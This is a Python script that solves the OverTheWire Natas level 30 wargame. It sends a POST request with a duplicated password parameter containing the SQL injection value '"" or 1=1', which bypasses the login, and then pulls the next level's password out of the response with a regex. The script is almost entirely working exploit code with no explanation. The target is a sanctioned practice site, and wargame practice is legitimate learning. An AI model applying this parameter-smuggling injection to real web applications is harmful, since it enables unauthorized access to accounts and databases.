import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def inject_payload():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '30'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas30', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    payload = [('username','natas31'), ('password','"" or 1=1'), ('password','2')]
    r = requests.post('http://natas30.natas.labs.overthewire.org/', auth=auth, data=payload)
    passreg = '[a-zA-Z0-9]{39}'
    #print(r.text)
    print(re.findall(passreg, r.text)[0][7:])

if __name__ == "__main__":
    inject_payload()
